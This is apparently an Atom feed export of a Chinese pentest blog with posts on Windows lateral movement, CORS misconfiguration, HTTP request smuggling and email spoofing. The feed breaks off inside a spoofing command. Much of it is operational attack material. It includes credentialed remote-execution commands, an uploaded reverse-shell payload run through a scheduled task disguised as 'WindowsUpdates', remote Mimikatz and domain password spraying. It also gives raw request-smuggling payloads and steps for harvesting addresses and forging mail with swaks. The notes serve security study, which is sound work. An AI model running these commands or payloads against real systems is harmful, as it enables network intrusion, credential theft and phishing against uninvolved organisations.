<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Twe1ve&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/"/>
  <updated>2020-06-02T03:47:37.129Z</updated>
  <id>https://github.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Lateral Movementt</title>
    <link href="https://github.com/2020/06/02/Lateral-Movementt/"/>
    <id>https://github.com/2020/06/02/Lateral-Movementt/</id>
    <published>2020-06-02T03:25:59.000Z</published>
    <updated>2020-06-02T03:47:37.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h2><p>优点：微软的东东</p><p><strong>执行原理：</strong> </p><ul><li><p>通过ipc$连接，释放psexesvc.exe到目标机器</p></li><li><p>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</p></li><li><p>客户端连接执行命令，服务端启动相应的程序并执行回显数据。</p></li><li><p>运行完后删除服务</p></li></ul><p><strong>使用方式：</strong></p><p>1、先建立IPC通道连接，然后直接使用</p><pre><code>net use \\192.168.0.116\ipc$ “password” /user:administratorpsexec.exe \\192.168.0.116 cmd                   进入半交互式cmdshell  ；    </code></pre><p>2、在psexec的参数中指定账户密码</p><pre><code>psexec.exe \\192.168.0.116 –u administrator –p password  cmd </code></pre><p>-accepteula参数表示接受Sysinternals的最终用户许可协议，用于机器第一次使用psexec时不跳出提示框</p><p>-hashes可支持hash密码</p><p><strong>使用psexec最低要求</strong></p><ol><li>远程机器的 139 或 445 端口需要开启状态，即 SMB；</li></ol><ol><li>明文密码或者 NTLM 哈希；</li></ol><ol><li>具备将文件写入共享文件夹的权限；</li></ol><ul><li>能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；</li></ul><ol><li>能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010）</li></ol><p>在启动psexec建立连接后，远程系统上会被安装一个服务:psexecsvc，安装服务会留下日志，而且psexec推出时有可能服务删除失败，所以不推荐使用psexec,而推荐WMIexec</p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p><strong>执行原理：</strong></p><p>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；<br>通过使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，用户可以使用 WMI 管理本地和远程计算机，整个运行过程都在计算机内存中发生，不会留下任何痕迹</p><p><strong>利用条件：</strong></p><ol><li><p>WMI服务开启，端口135，默认开启。</p></li><li><p>防火墙允许135、445等端口通信。</p></li></ol><p><strong>wmic</strong>（03以上自带，缺点是无回显，可以将命令执行结果写入本地磁盘配合type命令远程读取）：</p><p>工作组横向：</p><pre><code>wmic /node:192.168.0.116  /user:tw  /password:viq135311 process call create &quot;cmd.exe /c calc&quot;</code></pre><p>域内横向：</p><pre><code>wmic /node:target.domain /user:domain\user /password:password process call create &quot;cmd.exe /c calc”</code></pre><p><strong><a href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs">wmiexec</a></strong>： </p><p>获取半交互式shell：</p><pre><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.0.116 administrator password</code></pre><p>在远程系统上执行单条命令：</p><pre><code>cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password &quot;whoami&quot;</code></pre><p>在远程系统上执行bat脚本：</p><pre><code>cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password c:\programdata\test.bat</code></pre><p><strong>使用hash的情况：</strong><br>wce注入hash再进行连接</p><pre><code>wce –s 账号:主机名或域的名字:LM:NTLMcscript //nologo wmiexec.vbs /shell 192.168.0.1</code></pre><p>注意：抓取的LM hash是AAD3开头的，或者是No Password之类的，计用32个0代替LM hash</p><p><strong>Invoke-WMIMethod</strong>  （powershell自带,执行单条命令）</p><pre><code>$User=&quot;administrator&quot; $Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.0.116&quot; -Credential $Cred</code></pre><p><a href="https://blog.csdn.net/lhh134/article/details/104150949" target="_blank" rel="noopener">其他的利用</a>还有impacket套件、kali自带的pth-winexe、Invoke-TheHash.ps1(可批量)</p><h2 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h2><p>Service Control；可通过smb创建任务，使用sc命令实现执行SYSTEM权限的命令,执行的文件必须为服务二进制文件</p><pre><code>copy service.exe \\192.168.0.116\admin$\tempsc \\192.168.0.116 create TestService binpath= &quot;C:\windows\temp\service.exe&quot;sc \\192.168.0.116 start TestServicesc \\192.168.0.116 delete TestService</code></pre><p>msfvenom生成service exe：</p><pre><code>-f exe-service</code></pre><p>CS生成service exe：</p><pre><code>输出项选择windows service exe</code></pre><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><a href="https://github.com/Micropoor/Micro8/blob/master/%E7%AC%AC%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83%E8%AF%BE%EF%BC%9A%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20%5B%20windows%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%88%A9%E7%94%A8%20%5D.pdf">计划任务</a></h2><p>win xp/2003 为at命令</p><p>win7+ 为schtasks命令</p><p><strong>利用条件：</strong></p><ol><li><p>目标管理员账户凭据</p></li><li><p>当前机器可正常net use到远程机器</p></li><li><p>目标机器的计划任务服务“Task scheduler”已正常启动</p></li></ol><pre><code>net use \\192.168.0.116\admin$  /user:administrator  password ###连接目标共享net time \\192.168.0.116###查看目标主机当前时间xcopy c:\rev.exe \\192.168.0.116\admin$\temp\###上传payloadchcp 437  ###如果目标为中文系统，需要先调整字符集schtasks /create /s 192.168.0.116 /u administrator /p password /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/rev.exe&quot; /sc DAILY /mo 1 /ST 18:20###在远程目标机器上创建计划任务schtasks /run /tn WindowsUpdates /s 192.168.0.116 /U administrator /P password   ###创建完成后手动执行schtasks /query  /s 192.168.0.116 /U administrator /P password | findstr &quot;WindowsUpdates&quot;###检查运行状态schtasks  /delete /F /tn WindowsUpdates  /U administrator /P password###反弹shell之后，删除计划任务</code></pre><p>参数讲解：</p><p>/TN：任务名称</p><p>/TR：任务执行的程序</p><p>/ST：任务执行的时间</p><h2 id="winRM"><a href="#winRM" class="headerlink" title="winRM"></a>winRM</h2><p><strong>Windows Remote Management</strong><br>通过5985（HTTP）和5986（HTTPS）使用WMI的方式进行远程管理</p><p><strong>利用条件：</strong></p><ol><li><p>在win 2012之后(包括win 2012)的版本是默认开启的，win 2012之前利用需要手动开启winRM。</p></li><li><p>防火墙对5986、5985端口开放。</p></li></ol><p><strong>powershell：</strong></p><p><strong>第一次执行winrm</strong>：当前主机的trustedhosts设置为*，表示信任任意主机，之后重启winRM。</p><pre><code>Set-Item WSMan:localhost\client\trustedhosts -value *Restart-Service WinRM</code></pre><p><strong>常用命令：</strong></p><pre><code>Enable-PSRemoting -force   ###需要目标机器开启远程管理Test-NetConnection 192.168.0.116 -CommonTCPPort WINRM   ###检查目标机器是否监听winrm端口Get-Item WSMan:\localhost\Client\TrustedHosts   ###检查主机信任Invoke-Command 192.168.0.116  -Credential $cred -ScriptBlock {Hostname}   ###远程执行命令Enter-PSSession 192.168.0.116  -Credential  administrator   ###交互式用户凭证shell；会弹出一个输入密码的框</code></pre><p>用户凭证使用：</p><pre><code>$User=&quot;administrator&quot; $Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password Invoke-Command  192.168.0.116  -Credential $cred -ScriptBlock {Hostname}</code></pre><p><strong>直接使用mimikatz获取远程机器的账户密码</strong>：(在域中测试成功，工作组没能成功)</p><pre><code>Import-Module ./Invoke-Mimikatz.ps1Invoke-Mimikatz -ComputerName TARGET</code></pre><p><strong>winrs：</strong></p><pre><code>winrs -r:192.168.0.116  -u:administrator -p:password  &quot;ipconfig&quot;  ##执行命令winrs -r:192.168.0.116  -u:administrator -p:password  &quot;cmd&quot;         ##shell</code></pre><p><strong>evil-winrm</strong> 可通过用户凭证密码/hash直接获得交互shell</p><h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>COM：COM是Windows应用程序编程接口（API）的组件，该组件支持软件对象之间的交互。 通过COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库（DLL）或可执行文件（EXE）。</p><p>DCOM：Distributed COM；DCOM是COM的网络化版本，DCOM允许COM组件可以利用网络以二进制格式来传输数据</p><p><strong>获取DCOM列表</strong></p><pre><code>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication或Get-CimInstance Win32_DCOMApplication  #需win12以上</code></pre><p>存在某些具有命令执行功能的DCOM，可用于横向移动</p><p><strong>MMC20.Application COM</strong>：（域中测试成功，工作组只能本地成功而不能远程）<br>查看该DCOM信息：</p><pre><code>Get-ChildItem &apos;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}&apos;</code></pre><p>与目标建立连接：</p><pre><code>$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.0.116&quot;))$com.Document.ActiveView | Get-Member</code></pre><p>通过ExecuteShellCommand执行程序：</p><pre><code>$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname &gt; c:\fromdcom.txt&quot;,&quot;7&quot;)</code></pre><p><strong>Excel.Application</strong></p><p><a href="https://github.com/outflanknl/Excel4-DCOM">自动化脚本</a></p><p>##<a href="https://github.com/dafthack/DomainPasswordSpray"> Password Spraying</a> ##</p><p>Password Spraying实际上是域用户爆破</p><p>首次尝试使用一个用于多个用户名的通用密码登录。如果所有用户名的第一个密码都不正确，则攻击者将使用其他密码，在两次不同的密码猜测之间留出足够的时间；即采用大量用户名并使用单个密码将其循环的攻击方法，以免触发任何基于时间的帐户锁定阈值</p><p>自动从当前用户的域中生成用户列表，并尝试使用每个用户名和密码password进行身份验证</p><pre><code>Import-Module .\DomainPasswordSpray.ps1 Invoke-DomainPasswordSpray -Password password</code></pre><p><strong>其他可选参数：</strong></p><p>UserList-用于Spraying的用户列表。 如果未指定，将自动生成。</p><p>password-用于Spraying的单个密码。</p><p>PasswordList-用于Spraying的密码列表（不应该过多，导致账户锁定）</p><p>OutFile-输出结果到指定文件</p><p>domain-要对其进行Spraying的域。</p><p>Force-强制喷Spraying继续进行而不提示确认</p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p><strong><a href="https://github.com/0xthirteen/SharpRDP">sharpRDP</a></strong>：<br>SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456</p><p><strong>CS中实现：</strong></p><p><img src="1.png" alt=""></p><p><strong>基于tscon的RDP会话劫持</strong><br><a href="https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/" target="_blank" rel="noopener">https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/</a></p><p><a href="https://pentestlab.blog/tag/rdp-session-hijacking/" target="_blank" rel="noopener">https://pentestlab.blog/tag/rdp-session-hijacking/</a></p><p><a href="https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement" target="_blank" rel="noopener">https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement</a></p><h2 id="PTH-amp-PTT-amp-OverPTH"><a href="#PTH-amp-PTT-amp-OverPTH" class="headerlink" title="PTH&amp;PTT&amp;OverPTH:"></a>PTH&amp;PTT&amp;OverPTH:</h2><p>没什么特别的，需要注意的是在win10中，默认启用LocalAccountTokenFilterPolicy，用于控制过滤本地管理员组中所有本地用户的远程连接UAC。</p><p>当LocalAccountTokenFilterPolicy设置为0(默认值)时，只能使用RID 500本地管理员远程连接，且不会已完全的管理员身份进行连接，无法不存在潜在的提权</p><p>需要设置为1，非内置的sid为500的用户才能进行远程连接</p><p>不会影响本地Administrators组中的域帐户，仅影响本地帐户</p><pre><code>cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></pre><p><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank" rel="noopener">https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</a></p><h2 id="printers-open-webroots-good-old-Tomcat"><a href="#printers-open-webroots-good-old-Tomcat" class="headerlink" title="printers, open webroots, good old Tomcat"></a>printers, open webroots, good old Tomcat</h2><p>还有就是关注内网打印机、web共享目录、旧版本tomcat等有利于横向的脆弱性设备/环境</p><p>链接：</p><p><a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f</a></p><p><a href="https://lengjibo.github.io/LateralMovement/" target="_blank" rel="noopener">https://lengjibo.github.io/LateralMovement/</a></p><p><a href="https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/" target="_blank" rel="noopener">https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/</a></p><p><a href="https://ired.team/offensive-security/lateral-movement" target="_blank" rel="noopener">https://ired.team/offensive-security/lateral-movement</a></p><p><a href="https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/" target="_blank" rel="noopener">https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/</a></p><p><a href="https://my.oschina.net/u/4283892/blog/3307767" target="_blank" rel="noopener">https://my.oschina.net/u/4283892/blog/3307767</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PSEXEC&quot;&gt;&lt;a href=&quot;#PSEXEC&quot; class=&quot;headerlink&quot; title=&quot;PSEXEC&quot;&gt;&lt;/a&gt;PSEXEC&lt;/h2&gt;&lt;p&gt;优点：微软的东东&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行原理：&lt;/strong&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CORS配置不当学习</title>
    <link href="https://github.com/2020/06/02/CORS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/2020/06/02/CORS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-02T02:51:29.000Z</published>
    <updated>2020-06-02T02:58:21.300Z</updated>
    
    <content type="html"><![CDATA[<p>CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。</p><h2 id="SOP（Same-origin-policy："><a href="#SOP（Same-origin-policy：" class="headerlink" title="SOP（Same-origin policy：##"></a>SOP（Same-origin policy：##</h2><p>SOP同源策略,非同源的脚本不能访问或者操作其他域的页面对象</p><p>同源三要素：</p><ul><li>同域名 </li><li>同协议 </li><li>同端口</li></ul><h2 id="CORS（Cross-origin-Resourse-Sharing"><a href="#CORS（Cross-origin-Resourse-Sharing" class="headerlink" title="CORS（Cross-origin Resourse Sharing"></a>CORS（Cross-origin Resourse Sharing</h2><p>CORS跨域资源共享,使web应用程序能够无视同源策略，请求其他域的资源</p><p>CORS实现：（<a href="https://cloud.tencent.com/developer/article/1467364" target="_blank" rel="noopener">简单请求/非简单请求</a>）</p><p>请求头：</p><pre><code>1、origin,用于说明本次请求来自哪个源（域名+协议+端口）2、Access-Control-Request-Method,用来列出浏览器的CORS请求会用到哪些HTTP方法3、Access-Control-Request-Headers,指定浏览器CORS请求会额外发送的头信息字段</code></pre><p>响应头：</p><pre><code>1、Access-Control-Allow-Origin(ACAO) 用于指定允许访问资源的外域URI，对于携带身份凭证的请求不可使用通配符*2、Access-Control-Allow-Credentials表明是否允许浏览器读取response的内容，当用在preflight预检请求的响应中时，指定实际的请求是否可使用credentials</code></pre><h2 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h2><p>CORS的漏洞主要看当请求中带有Origin头部字段时，服务器的返回包是否带有CORS的相关字段（Access-Control-Allow*）并且允许Origin的域访问，因此origin字段的值需要多尝试不同的域或者为null。</p><p>使用burpsuit进行快速验证：</p><p><img src="1.png" alt=""></p><p>访问需要检测的网站，访问多个不同的页面，访问足够多后在BurpSuite的Proxy模块下的HTTP history来筛选带有CORS头部的值:</p><p><img src="2.png" alt=""></p><p>也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为<strong>浏览器已经会阻止如下的配置</strong>。</p><pre><code>Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true</code></pre><h2 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a><a href="https://xz.aliyun.com/t/2745#toc-17" target="_blank" rel="noopener">绕过</a>：</h2><ul><li>NULL源</li><li>使用目标域名作为子域名</li><li>…</li></ul><p><strong>CORS与JSONP的比较</strong></p><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p><p>更多学习链接：</p><p>CORS三种攻击场景： <a href="https://xz.aliyun.com/t/4663" target="_blank" rel="noopener">https://xz.aliyun.com/t/4663</a></p><p>CORS安全完全指南： <a href="https://xz.aliyun.com/t/2745" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。&lt;/p&gt;
&lt;h2 id=&quot;SOP（Same-origin-policy：&quot;&gt;&lt;a href=&quot;#SOP（Same-origin-policy：&quot; class=&quot;headerlink&quot; title=&quot;SOP（Same
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>HTTP Request Smuggling</title>
    <link href="https://github.com/2020/06/02/HTTP-Request-Smuggling/"/>
    <id>https://github.com/2020/06/02/HTTP-Request-Smuggling/</id>
    <published>2020-06-02T02:34:05.000Z</published>
    <updated>2020-06-02T02:49:19.532Z</updated>
    
    <content type="html"><![CDATA[<p><strong>HTTP请求走私（HTTP Request Smuggling）</strong></p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突</p><p>HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致了HTTP Request Smuggling<br>如果前端服务器和后端服务器相对于（可能是混淆的）Transfer-Encoding 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞</p><p>这也意味着如果网站没有负载平衡，CDN和反向代理，则不会产生HTTP Request Smuggling。引入的代理层越多，越容易受到HTTP Request Smuggling攻击</p><p><img src="1.png" alt=""></p><h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h2><p>Content-Length指的就是用 POST Method时带入的 data 的长度（此长度不包含\r\n）</p><pre><code>POST /search HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling</code></pre><h2 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h2><pre><code>POST /search HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedb---&gt; data长度，十六进制q=smuggling---&gt;data0---&gt;结束符，后接\r\n\r\n</code></pre><h2 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep Alive##"></a>Keep Alive##</h2><p>在HTTP1.1中默认使用keep alive，从而允许在单个连接上承载多个请求和响应<br>所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。</p><p>相反，HTTP请求中带有Connection: close的话，通信完成之后，服务器会中断 TCP 连接</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>能够绕过安全机制，实施未授权访问，获取敏感信息并直接危害其他用户</p><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><ul><li>CL.TE：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。</li><li>TE.CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li><li>TE.TE：前端服务器和后端服务器均支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。   </li></ul><pre><code>Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked</code></pre><h2 id="漏洞检测-amp-验证-amp-利用"><a href="#漏洞检测-amp-验证-amp-利用" class="headerlink" title="漏洞检测&amp;验证&amp;利用"></a>漏洞检测&amp;验证&amp;利用</h2><p><img src="2.png" alt=""></p><p>需要关闭自动更新Content-Length功能：</p><p><img src="3.png" alt=""></p><p><strong>漏洞检测：</strong></p><pre><code>POST / HTTP/1.1Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked3abcQ</code></pre><p>上边构造的payload，Q并不在长度范围内，前端并不会处理到Q，而此时后端会等待下一个块大小超时；因此会有明显的时间延迟<br>如果两个服务器都处于同步状态（TE.TE或CL.CL），则该请求将被前端拒绝，或者被两个系统无害处理。最后，如果以相反的方式发生同步（TE.CL），则由于无效的块大小’Q’，前端将拒绝该消息，而不会将其转发到后端。这样可以防止后端套接字中毒。</p><p><strong>检测TE.CL</strong></p><pre><code>POST / HTTP/1.1Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G</code></pre><p>0终止符后，后端将超时，等待X到达</p><p><strong>两种数据包比较：</strong></p><p><img src="4.png" alt=""></p><p><strong>漏洞验证</strong></p><p><img src="5.png" alt=""></p><p><strong>漏洞利用：</strong>(发包需要多试几次)</p><p>CL.TE:</p><pre><code>POST / HTTP/1.1Host: ac681fb21e744a6b8007290700200056.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G</code></pre><p>TE.CL:</p><pre><code>POST / HTTP/1.1Host: ac681fb21e744a6b8007290700200056.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10</code></pre><p>终止符0后边接 \r\n\r\n</p><p>TE.TE：</p><pre><code>POST / HTTP/1.1Host: ac681fb21e744a6b8007290700200056.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunkedTransfer-Encoding: xxx5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10</code></pre><p>多种利用案例<br>靶场：<a href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting</a>  </p><p>案例视频讲解： <a href="https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10" target="_blank" rel="noopener">https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10</a></p><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">https://xz.aliyun.com/t/6878</a> —&gt;内含很多利用案例</p><p><a href="https://www.youtube.com/watch?v=kgkRih2MQtU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=kgkRih2MQtU</a></p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></p><p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a> 内含很多利用案例</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;HTTP请求走私（HTTP Request Smuggling）&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot; class=&quot;headerlink&quot; title=&quot;原理：&quot;&gt;&lt;/a&gt;原理：&lt;/h2&gt;&lt;p&gt;HTTP规范提供了
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>邮件伪造</title>
    <link href="https://github.com/2020/05/30/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/"/>
    <id>https://github.com/2020/05/30/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/</id>
    <published>2020-05-30T01:50:48.000Z</published>
    <updated>2020-05-30T02:04:15.616Z</updated>
    
    <content type="html"><![CDATA[<p><strong>SPF：Sender Policy FrameworkSPF</strong></p><p>原理：创建至少一个DNS TXT记录来启用SPF</p><p>SPF验证过程：</p><ol><li>接收端获取发件端IP</li><li>接收端查询发件域名的TXT记录</li><li>根据发件端的SPF记录的规则进行匹配，按照声明的策略进行处理</li></ol><p>邮件服务器收到来自<a href="mailto:xx@example.com">xx@example.com</a>的一封邮件，发件主机IP为45.77.87.90。这时邮件服务器回去查询example.com的SPF记录，假若SPF记录中允许45.77.87.90,则该邮件为正常邮件</p><p>SPF DNS TXT记录示例</p><pre><code>com. IN TXT “v=spf1 a ip4:192.168.1.1 ~all”</code></pre><p><strong>DKIM：Domain Keys Identified Mail</strong><br>区别于SPF，DKIM使用非对称加密的方式对发件人进行身份验证。收件人可以使用发件人的公钥来验证经过数字签名的电子邮件</p><p>DKIM DNS TXT记录示例（p是Base64格式的电子邮件服务器的公钥）：</p><pre><code>selector._domainkey.example.com IN TXT “v=DKIM1;p=RAG…123”</code></pre><p><strong>DMARC：Domain-Based Message Authentication, Reporting and Conformance</strong></p><p>DMARC只是一项聚合服务，用于确定发件人是否使用SPF和DKIM，以及发件人如何建议收件人应处理声称来自发件人域的失败/欺骗性电子邮件</p><p>DMARC DNS TXT记录示例</p><pre><code>TXT IN &quot;v=DMARC1;p=quarantine;pct=100;rua=mailto:dmarccheck@example.com;&quot;</code></pre><p>总结起来就是：</p><ol><li>SPF检查电子邮件来源的IP地址是否已授权</li><li>DKIM使用密钥检查消息以进行签名验证</li><li>DMARC一次性包含了两种方法</li></ol><p><strong><a href="http://ancorathemes.com/2018/10/30/how-to-find-anyones-email-address-infographic/" target="_blank" rel="noopener">搜集邮箱</a></strong>（作为伪造目标，增加可信度）：</p><p>1、在线邮箱地址查找:</p><p><a href="https://hunter.io/" target="_blank" rel="noopener">https://hunter.io/</a></p><p><a href="http://www.veryvp.com" target="_blank" rel="noopener">http://www.veryvp.com</a></p><p><a href="https://anymailfinder.com/" target="_blank" rel="noopener">https://anymailfinder.com/</a></p><p><a href="https://www.findemails.com/" target="_blank" rel="noopener">https://www.findemails.com/</a></p><p>2、whois邮箱</p><p>3、bing必应搜索”@hzu.edu.cn”</p><p>4、目标站点中的联系我们处获取邮箱</p><p>5、根据人名猜测/爆破，验证邮箱是否存在</p><p><a href="https://tools.verifyemailaddress.io/" target="_blank" rel="noopener">https://tools.verifyemailaddress.io/</a></p><p>6、根据人名创建可能的邮箱地址</p><p><a href="http://metricsparrow.com/toolkit/email-permutator/" target="_blank" rel="noopener">http://metricsparrow.com/toolkit/email-permutator/</a></p><p>7、邮箱抓取脚本<br><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><pre><code>theharvester -d  hzu.edu.cn -l 1000 -b all</code></pre><p><strong>验证是否开启SPF/DKIM：</strong></p><pre><code>nslookup -type=txt xxx.com</code></pre><p>检测SPF记录是否正确：<br><a href="https://www.kitterman.com/spf/validate.html" target="_blank" rel="noopener">https://www.kitterman.com/spf/validate.html</a></p><h2 id="邮件伪造："><a href="#邮件伪造：" class="headerlink" title="邮件伪造："></a>邮件伪造：</h2><p><strong>没有SPF：</strong><br>1、直接在线发送伪造邮件：<a href="https://emkei.cz/http://tool.chacuo.net/mailanonymous" target="_blank" rel="noopener">https://emkei.cz/http://tool.chacuo.net/mailanonymous</a></p><p>2、 swaks</p><pre><code>swaks --to  webmaster@hzu.edu.cn --from tw@hzu.edu.cn --ehlo hzu.edu.cn --body hello --header &quot;Subject: 